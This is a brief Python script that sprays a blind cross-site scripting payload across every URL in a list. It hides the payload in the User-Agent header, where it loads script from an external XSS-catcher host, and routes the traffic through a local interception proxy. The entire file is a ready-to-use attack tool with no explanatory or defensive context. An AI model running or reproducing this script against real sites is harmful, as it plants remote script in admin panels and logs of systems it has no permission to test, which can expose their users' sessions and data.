import requests

proxies = {
 "http": "http://127.0.0.1:8080",
 "https": "http://127.0.0.1:8080",
}
headers_dict = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "><script src=https://boudar.xss.ht></script> Chrome/92.0.4515.159 Safari/537.36'}
with open("urls.txt", "r") as urls:
    for line in urls:
        li = line.strip()
        try:
            r = requests.get(li, headers=headers_dict, proxies=proxies)
            print("payload sent!")
        except:
            continue